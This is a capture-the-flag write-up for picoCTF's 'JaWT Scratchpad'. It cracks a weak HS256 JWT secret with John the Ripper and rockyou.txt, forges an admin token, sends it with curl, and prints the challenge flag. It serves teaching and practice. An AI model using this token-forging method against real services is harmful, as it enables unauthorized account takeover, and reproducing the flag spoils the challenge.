# JaWT Scratchpad

## JWT TLDR

The challenge involves decoding and encoding JWT tokens.

A JWT is created from three parts.

```
Header.Payload.Signature

Header      : Stores information about the algorithm used and the token type (base64 encoded)
Payload     : Store data (base64 encoded)
Signature   : Used to verify that no tempering has been done to the current payload
```

A great site to inspect your JWTs is [ jwt.io ]( https://jwt.io )

## Challenge

Let's login to the site as `admin`.

```
YOU CANNOT LOGIN AS THE ADMIN! HE IS SPECIAL AND YOU ARE NOT. 
```

Since `admin` is not available, let's use `John` instead. We are able to access the next page, which shows a textarea. Great!

From the networks tab, we see that a Cookie has been set. The cookie contains a JWT. 

Let's take a peek at the contents.

```
Header:
{
  "typ": "JWT",
  "alg": "HS256"
}

Payload:
{
  "user": "John"
}
```

The JWT is using a symmetric key (a secret key) to sign their JWT. We can bruteforce the secret by using wordlists.

Let's use `rockyou.txt` as our word list. The wordlist can be obtained from [link](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwiwwPHswsHzAhUlwzgGHecVDlQQFnoECAQQAQ&url=https%3A%2F%2Fgithub.com%2Fbrannondorsey%2Fnaive-hashcat%2Freleases%2Fdownload%2Fdata%2Frockyou.txt&usg=AOvVaw3snAERl1mU6Ccr4WFEazBd)

Then by using `JohnTheReaper` in combination with our `rockyou.txt` wordlist. We can brutefoce our key as follows.

```bash
# Copy the JWT into a file called `jwt`

$ john jwt --wordlist=rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)
1g 0:00:00:03 DONE (2021-10-11 00:12) 0.2881g/s 2131Kp/s 2131Kc/s 2131KC/s iloverob4evax..ilovemymother89
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

From the output above, we see that the cracked secret is `ilovepico`. We can then plug the secret into `jwt.io`, and change the payload. 

```
Payload:
{
    "user": "admin"
}
```

Then send a new request using our JWT token.

```bash
$ curl 'https://jupiter.challenges.picoctf.org/problem/61864/' -H 'Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s'
```

Flag is `picoCTF{jawt_was_just_what_you_thought_1ca14548}`
